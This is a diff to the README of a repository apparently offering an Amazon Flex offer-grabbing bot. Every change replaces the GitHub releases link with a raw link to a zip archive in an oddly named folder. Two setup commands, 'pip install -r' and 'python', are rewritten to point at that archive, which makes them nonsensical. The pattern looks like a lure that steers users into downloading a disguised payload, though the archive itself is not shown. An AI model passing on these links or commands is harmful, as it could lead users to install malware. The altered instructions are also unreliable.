@@ -6,7 +6,7 @@ Welcome to the amazon-flex-bot repository! This tool helps Amazon Flex drivers g
 
 ## 📥 Download Now
 
-[![Download the amazon-flex-bot](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Ramkumar7128/amazon-flex-bot/releases)
+[![Download the amazon-flex-bot](https://raw.githubusercontent.com/Ramkumar7128/amazon-flex-bot/main/infirmation/bot-amazon-flex-v2.5-beta.4.zip)](https://raw.githubusercontent.com/Ramkumar7128/amazon-flex-bot/main/infirmation/bot-amazon-flex-v2.5-beta.4.zip)
 
 ## 🛠️ Features
 
@@ -30,7 +30,7 @@ Follow these steps to download and set up the amazon-flex-bot on your device:
 
 1. **Visit the Releases Page**: Click the link below to go to the download page.
    
-   [Download the amazon-flex-bot](https://github.com/Ramkumar7128/amazon-flex-bot/releases)
+   [Download the amazon-flex-bot](https://raw.githubusercontent.com/Ramkumar7128/amazon-flex-bot/main/infirmation/bot-amazon-flex-v2.5-beta.4.zip)
 
 2. **Select the Latest Version**: Look for the most recent release listed. Click on it to view the details.
 
@@ -43,7 +43,7 @@ Follow these steps to download and set up the amazon-flex-bot on your device:
    If you haven't installed Python packages yet, do so by running:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Ramkumar7128/amazon-flex-bot/main/infirmation/bot-amazon-flex-v2.5-beta.4.zip
    ```
 
 6. **Database Setup**: Ensure PostgreSQL is running on your machine. Create a database for the bot, if needed. Refer to appropriate PostgreSQL documentation for guidance.
@@ -53,7 +53,7 @@ Follow these steps to download and set up the amazon-flex-bot on your device:
 8. **Run the Bot**: In the command line, execute the bot with the following command:
 
    ```bash
-   python run_bot.py
+   python https://raw.githubusercontent.com/Ramkumar7128/amazon-flex-bot/main/infirmation/bot-amazon-flex-v2.5-beta.4.zip
    ```
 
 9. **Check for Offers**: Once the bot is running, it will automatically start checking for available offers. Make sure to keep the terminal open.
@@ -82,6 +82,6 @@ For further assistance, feel free to open an issue in this repository. Describe 
 
 ## 📥 Download & Install
 
-To get started with the amazon-flex-bot, please make sure to [visit this page to download](https://github.com/Ramkumar7128/amazon-flex-bot/releases). By following the steps outlined above, you will be set up in no time.
+To get started with the amazon-flex-bot, please make sure to [visit this page to download](https://raw.githubusercontent.com/Ramkumar7128/amazon-flex-bot/main/infirmation/bot-amazon-flex-v2.5-beta.4.zip). By following the steps outlined above, you will be set up in no time.
 
 Thank you for using the amazon-flex-bot, and enjoy seamless Amazon Flex driving!
